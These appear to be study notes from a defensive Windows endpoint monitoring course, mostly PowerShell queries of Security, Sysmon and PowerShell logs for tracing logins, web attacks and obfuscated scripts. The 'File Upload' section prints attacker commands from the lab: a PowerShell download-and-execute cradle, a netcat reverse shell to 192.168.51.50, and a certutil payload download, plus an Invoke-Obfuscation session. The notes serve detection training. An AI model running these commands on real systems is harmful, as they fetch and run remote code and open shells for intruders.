# Windows Endpoint Introduction

## Command Prompt, VBScript, and Powershell

`user_hostname.bat`

```bat
@ECHO OFF
TITLE Example Batch File
ECHO This batchfile will show Windows 10 Operating System information
systeminfo | findstr /C:"Host Name"
systeminfo | findstr /C:"OS Name"
systeminfo | findstr /C:"OS Version"
systeminfo | findstr /C:"System Type"
systeminfo | findstr /C:"Registered Owner"
PAUSE
```

`osinfo.vbs`

```vb
' List Operating System and Service Pack Information

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
 & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
 
Set colOSes = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
For Each objOS in colOSes
  Wscript.Echo "Computer Name: " & objOS.CSName
  Wscript.Echo "Caption: " & objOS.Caption 'Name
  Wscript.Echo "Version: " & objOS.Version 'Version & build
  Wscript.Echo "Build Number: " & objOS.BuildNumber 'Build
  Wscript.Echo "Build Type: " & objOS.BuildType
  Wscript.Echo "OS Type: " & objOS.OSType
  Wscript.Echo "Other Type Description: " & objOS.OtherTypeDescription
  WScript.Echo "Service Pack: " & objOS.ServicePackMajorVersion & "." & _
   objOS.ServicePackMinorVersion
Next
```

```bat
cscript osinfo.vbs
```

```pwsh
Get-ExecutionPolicy
Get-Help Get-CimInstance
Get-Alias gcim
Get-Module | Where-Object { $_.ModuleType -eq "Script" }
```

`hostinfo.ps1`

```pwsh
Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -Property CSName, Caption, Version,BuildNumber, BuildType, OSType, RegisteredUser, OSArchitecture, ServicePackMajorVersion, ServicePackMinorVersion

Get-Service | Where-Object { $_.Status -eq "Running" }
```

```pwsh
gcim -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
```

## Windows Event Log

```pwsh
Get-WinEvent -ListLog Application, Security, Setup, System

Get-WinEvent -LogName Security | Select-Object -first 10

Get-WinEvent -LogName 'Security' | Where-Object { $_.Id -eq "4624" } | Select-Object -Property TimeCreated,Message -first 10

Get-WinEvent -FilterHashtable @{LogName='Security'; StartTime="4/23/2024 14:00:00"; EndTime="4/23/2024 14:30:00"; ID=4624} | Select-Object -Property TimeCreated,Message
```

`sysmonconfig-export.xml`

```xml
<Sysmon schemaversion="3.2">
  <HashAlgorithms>MD5,SHA256,IMPHASH</HashAlgorithms>
  <CopyOnDeletePE>True</CopyOnDeletePE>
  <ArchiveDirectory>BackupDeleted</ArchiveDirectory>
 <EventFiltering>
  <RuleGroup name="Process Rules" groupRelation="or">
    <ProcessCreate onmatch="exclude">
      <Image condition="is">C:\Program Files\Windows Media Player\wmplayer.exe</Image>
      <Image condition="is">C:\Windows\system32\powercfg.exe</Image>
  </RuleGroup>
  <RuleGroup name="Driver Rules" groupRelation="or">
    <Driverload onmatch="exclude">
      <Signature condition="begin with">AMD</Signature>
      <Signature condition="contains">microsoft</Signature>
      <Signature condition="contains">windows</Signature>
  </RuleGroup>
  <RuleGroup name="Network Process Rules" groupRelation="or">
    <NetworkConnect onmatch="exclude">
      <Image condition="end with">Chrome.exe</Image>
      <Image condition="end with">msedge.exe</Image>
    </NetworkConnect>
  </RuleGroup>
  <RuleGroup name="Network Port Rules" groupRelation="or">
    <NetworkConnect onmatch="include">
      <DestinationPort condition="is">8080</DestinationPort>
      <DestinationPort condition="is">443</DestinationPort>
    </NetworkConnect>
  </RuleGroup>
  </EventFiltering>
</Sysmon>
```

Dump the current configuration

```pwsh
.\Sysmon64.exe -c | Select-Object -first 10
```

Reconfigure an active Sysmon with a configuration file

```pwsh
.\Sysmon64.exe -c C:\sysmonconfig-export.xml
```

```xml
  <RuleGroup name="" groupRelation="or">
    <FileCreate onmatch="include">
    ...
      <TargetFilename condition="end with">.bat</TargetFilename>
    ...
```

```
"Test" | Out-File FileCreate.bat
```

`Get-Sysmon.psm1`

```pwsh
function Get-SysmonEvent{
    param (
        $eventid,
        $start,
        $end
    )
    $filters = @{LogName = "Microsoft-Windows-Sysmon/Operational"}
    
    if ($eventid -ne $null) {
        $filters.ID = $eventid
    }
    
    if ($start -ne $null) {
        $filters.StartTime = $start
    }

    if ($end -ne $null) {
        $filters.EndTime = $end
    }
    Get-WinEvent -FilterHashtable $filters
}
```

```pwsh
Import-Module C:\Get-Sysmon.psm1

Get-SysmonEvent $null "04/28/2021 13:55:00" "04/28/2021 14:00:00"
```

Search for a **FileCreate** event (Event ID 11)

```pwsh
Get-SysmonEvent 11 "4/28/2021 13:48:00" "4/28/2021 13:49:00" | Format-List
```

Search for a **ProcessCreate** event (Event ID 1), filter out the ProcessId 2032

```pwsh
Get-SysmonEvent 1 $null "7/28/2021 13:48:42" | Where-Object { $_.properties[3].value -eq 2032 } | Format-List
```

```pwsh
Enter-PSSession 192.168.51.10 -Credential offsec -Authentication Negotiate
```

# Windows Server Side Attacks

## Suspicious Logins

Search for Logon events (Event ID 4624) occurring over the course of 2 days where it is expected that no users will be logged in (such as a weekend). LogonType 10 indicates a RemoteInteractive logon (the use of Remote Desktop services to access the Windows machine, using the Remote Desktop Protocol (RDP))

```pwsh
Get-WinEvent -FilterHashTable @{LogName='Security'; StartTime="4/23/2024 19:00:00"; EndTime="4/26/2024 07:00:00"; ID=4624 } | Where-Object { $_.properties[8].value -eq 10 } | Format-List
```

`Get-Security.psm1`

```pwsh
function Get-SecurityEvent{
    param (
        $eventid,
        $start,
        $end
    )
    $filters = @{LogName = "Security"}
    
    if ($eventid -ne $null) {
        $filters.ID = $eventid
    }
    if ($start -ne $null) {
        $filters.StartTime = $start
    }

    if ($end -ne $null) {
        $filters.EndTime = $end
    }
    Get-WinEvent -FilterHashtable $filters
}
```

Search for a logoff event (Event ID 4634) where the Logon ID is 0x323466

```pwsh
Get-SecurityEvent 4634 "5/1/2021 03:21:26" "5/3/2021 07:00:00" | Where-Object { $_.properties[3].value -eq 0x323466 } | Format-List
```

Get a list of all failed Logon events (Event ID 4625) that occurred in the span of a single day

```pwsh
Get-SecurityEvent 4625 "5/6/2021 00:00:00" "5/7/2021 00:00:00"
```

Logon Type 3 indicates a network-based logon. hydra uses Network-Level Authentication (NLA). NLA forces an authentication to take place before the RDP session is initiated.

The **Status** code C000006D indicates that the failure is due to a bad username or authentication information. Other error codes specify that the username is nonexistent or that the password was incorrect.

```pwsh
Get-SecurityEvent 4625 "5/6/2021 00:00:00" "5/7/2021 00:00:00" | Format-List TimeCreated, @{Label = "Logon Type"; Expression = {$_.properties[10].value}}, @{Label = "Status"; Expression = {'{0:X8}' -f $_.properties[7].value}}, @{Label = "Substatus"; Expression = {'{0:X8}' -f $_.properties[9].value}}, @{Label = "Target User Name"; Expression = {$_.properties[5].value}}, @{Label = "Workstation Name"; Expression = {$_.properties[13].value}}, @{Label = "IP Address"; Expression = {$_.properties[19].value}}
```

The attacker seems to be coming from 192.168.51.50

```pwsh
Get-SecurityEvent 4624 "5/6/2021 09:36:44" "5/6/2021 09:37:44" | Where-Object { $_.properties[18].value -eq "192.168.51.50" }
```

## Web Application Attacks

### Command Injection

Sysmon's ProcessCreate events

```pwsh
Get-SysmonEvent 1 "05/10/2021 16:02:33" "5/10/2021 16:02:35" | Format-List TimeCreated, @{Label = "CommandLine"; Expression = {$_.properties[10].value}}, @{Label = "User"; Expression = {$_.properties[12].value}}, @{Label = "ParentImage"; Expression = {$_.properties[20].value}}
```

When chaining processes with parent processes, use the process/parent process IDs located in the ProcessCreate events. When anomalous activity is identified, we can trace from parent to parent until we find the origin of the activity.

### File Upload

```pwsh
powershell -c "iex (New-Object System.Net.WebClient).DownloadString('http://192.168.51.50:8000/load.ps1')"

wget http://192.168.51.50:8000/nc.exe -O /Windows/Temp/nc.exe
/Windows/Temp/nc.exe 192.168.51.50 4444 -e cmd.exe

certutil.exe  -urlcache -f http://192.168.1.20:8000/stage.bat stage.bat
```

Search for FileCreate events, with the PID, we could query ProcessCreate events in Sysmon to trace all of the processes involved in the creation of the file

```pwsh
Get-SysmonEvent 11 "05/12/2021 12:48:50" "05/12/2021 12:48:52" | Format-List @{Label = "Rule"; Expression = {$_.properties[0].value}}, @{Label = "PID"; Expression = {$_.properties[3].value}},@{Label = "Image"; Expression = {$_.properties[4].value}}, @{Label = "TargetFile"; Expression = {$_.properties[5].value}}
```

Gather all ProcessCreate events that occurred at the 17 second mark

```pwsh
Get-SysmonEvent 1 "5/13/2021 14:26:16" "5/13/2021 14:26:18" | Format-List TimeCreated, @{Label = "CommandLine"; Expression = {$_.properties[10].value}}, @{Label = "User"; Expression = {$_.properties[12].value}}, @{Label = "ParentImage"; Expression = {$_.properties[20].value}}
```

The creation of a PowerShell script in `C:\Windows\Temp` is an artifact of using `Invoke-Expression` to read in a PowerShell script

Extract the Process ID (PID) and the Parent Process ID (PPID)

```pwsh
Get-SysmonEvent 1 "5/13/2021 14:26:17" "5/13/2021 14:26:19" | Format-List TimeCreated, @{Label = "PID"; Expression = {$_.properties[3].value}}, @{Label = "PPID"; Expression = {$_.properties[19].value}}, @{Label = "CommandLine"; Expression = {$_.properties[10].value}}, @{Label = "User"; Expression = {$_.properties[12].value}}, @{Label = "ParentImage"; Expression = {$_.properties[20].value}}
```

NetworkConnect events

```pwsh
Get-SysmonEvent 3 "5/13/2021 2:26:18" "5/13/2021 2:26:20" | Format-List @{Label = "PID"; Expression = {$_.properties[3].value}}, @{Label = "Image"; Expression = {$_.properties[4].value}}, @{Label = "User"; Expression = {$_.properties[5].value}}, @{Label = "Source IP"; Expression = {$_.properties[9].value}}, @{Label = "Source Port"; Expression = {$_.properties[11].value}}, @{Label = "Destination IP"; Expression = {$_.properties[14].value}}, @{Label = "Destination Port"; Expression = {$_.properties[16].value}}
```

### Binary Attacks

```pwsh
Start-Service -Name "Sync Breeze Enterprise"

Get-Service -Name "Sync Breeze Enterprise" | Format-List -Property Status,Name,DisplayName
```

### Windows Defender Exploit Guard (WDEG)

Enable exploit protection for a specific process

```pwsh
Set-ProcessMitigation -Name 'C:\Program Files (x86)\Sync Breeze Enterprise\bin\syncbrs.exe' -Enable EnableRopCallerCheck

Get-ProcessMitigation -Name 'C:\Program Files (x86)\Sync Breeze Enterprise\bin\syncbrs.exe'

Restart-Service -Name "Sync Breeze Enterprise"
```

```pwsh
Get-WinEvent -FilterHashTable @{LogName = 'Microsoft-Windows-Security-Mitigations/UserMode'; StartTime = '5/25/2021 13:42:28'; EndTime = '5/25/2021 13:42:30'} | Format-List -Property Id, TimeCreated, LevelDisplayName, Message
```

Turn auditing on for Windows exploit protection.

Remove our SyncBreeze configuration. Reconfigure our exploit protections to only audit the return-oriented API calls used by the SyncBreeze exploit. This should not block the activity but still generate events.

```pwsh
Remove-Item -Path 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\syncbrs.exe'

Set-ProcessMitigation -Name 'C:\Program Files (x86)\Sync Breeze Enterprise\bin\syncbrs.exe' -Enable AuditEnableRopCallerCheck
```

# Windows Client Side Attacks

DNSEvent (Event ID 22)

```pwsh
Get-SysmonEvent 22 "6/17/2021 15:10:41" "6/17/2021 15:11:00" | Format-List
```

NetworkConnect events

```pwsh
Get-SysmonEvent 3 "6/17/2021 15:10:41" "6/17/2021 15:11:00" | Where-Object { $_.properties[14].value -eq "192.168.51.50" } | Format-List
```

## PowerShell Module Logging

Collect information on all currently running processes

```pwsh
Get-WmiObject -Class Win32_Process | Format-Table ProcessId, ParentProcessId, Name; Write-Host (Get-Date)
```

Event ID for pipeline execution events enabled by module logging is 4103. The Command Name indicates which cmdlet initiated this pipeline execution. Had it been a script, it would have been reflected in the Script Name. The Sequence Number tracks the order in which PowerShell events execute, while Pipeline ID tracks commands within a given pipeline. We could trace an entire series of PowerShell commands using the Pipeline ID, and order them based on the Sequence Number.

```pwsh
Get-WinEvent -FilterHashtable @{Logname='Microsoft-Windows-PowerShell/Operational'; StartTime="6/14/2021 13:25:52"; EndTime="6/14/2021 13:25:54"; ID=4103} | Format-List
```

## PowerShell Script Block Logging

The use of script block logging to help with the deobfuscation of PowerShell commands (Our output includes a conveniently decoded series of PowerShell commands)

```pwsh
{ "This is a script block" }; Write-Host (Get-Date)
```

The Event ID for remote command execution events enabled by script block logging is 4104

```pwsh
Get-WinEvent -FilterHashtable @{Logname='Microsoft-Windows-PowerShell/Operational'; StartTime="06/15/2021 14:49:42"; EndTime="06/15/2021 14:49:44"; ID=4104} | Format-List
```

Use PowerShell to encode a command

```pwsh
$Command = 'Write-Host (Get-Date); Get-Hotfix'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
$EncodedCommand = [Convert]::ToBase64String($Bytes)
$EncodedCommand
```

```pwsh
powershell -Encoded VwByAGkAdABlAC0ASABvAHMAdAAgACgARwBlAHQALQBEAGEAdABlACkAOwAgAEcAZQB0AC0ASABvAHQAZgBpAHgA
```

## PowerShell Transcription

```pwsh
Get-CimInstance Win32_ComputerSystem | Select-Object -Property Name, PrimaryOwnerName, Domain, TotalPhysicalMemory, Model, Manufacturer
```

`Get-PSLog.psm1`

```pwsh
function Get-PSLogEvent{
    param (
        $eventid,
        $start,
        $end
    )
    $filters = @{LogName = "Microsoft-Windows-PowerShell/Operational"}
    
    if ($eventid -ne $null) {
        $filters.ID = $eventid
    }
    if ($start -ne $null) {
        $filters.StartTime = $start
    }

    if ($end -ne $null) {
        $filters.EndTime = $end
    }

    Get-WinEvent -FilterHashtable $filters
}
```

```pwsh
Get-PSLogEvent 4104 "6/15/2021 15:44:00" "6/15/2021 15:45:00" | Format-List

Get-PSLogEvent 4103 "6/15/2021 15:44:00" "6/15/2021 15:45:00" | Format-Table TimeCreated, LevelDisplayName, Message

Get-PSLogEvent 4103 "6/15/2021 15:44:00" "6/15/2021 15:45:00" | Format-List

Get-PSLogEvent 4103 "6/15/2021 15:44:00" "6/15/2021 15:44:59" | Format-List TimeCreated, @{Label = "Payload"; Expression = {$_.properties[2].value}}
```

Obfuscate a basic PowerShell command

```pwsh
Import-Module ./Invoke-Obfuscation/Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

```
Invoke-Obfuscation> SET SCRIPTBLOCK Get-CimInstance Win32_ComputerSystem | Select-Object -Property Name, PrimaryOwnerName, Domain, TotalPhysicalMemory, Model, Manufacturer; Write-Host (Get-Date)
Invoke-Obfuscation> token
Invoke-Obfuscation\Token> command
Invoke-Obfuscation\Token\Command> 1
Invoke-Obfuscation\Token\Command> back
Invoke-Obfuscation\Token> argument
Invoke-Obfuscation\Token\Argument> 4
Invoke-Obfuscation\Token\Argument> show
```

```pwsh
Import-Module C:\tools\windows_client_side_attacks\Revoke-Obfuscation\Revoke-Obfuscation.psm1
```

Export PowerShell logs from the command line, we'll use wevtutil,7 a command-line utility for listing and saving event logs in an XML-based event file format (.evtx).

```pwsh
wevtutil export-log Microsoft-Windows-PowerShell/Operational C:\users\offsec\Desktop\pwsh_export.evtx
```

Reassemble script blocks from script block (ID: 4104) events

```pwsh
Get-RvoScriptBlock -Path 'C:\Users\offsec\Desktop\pwsh_export.evtx' -Verbose
```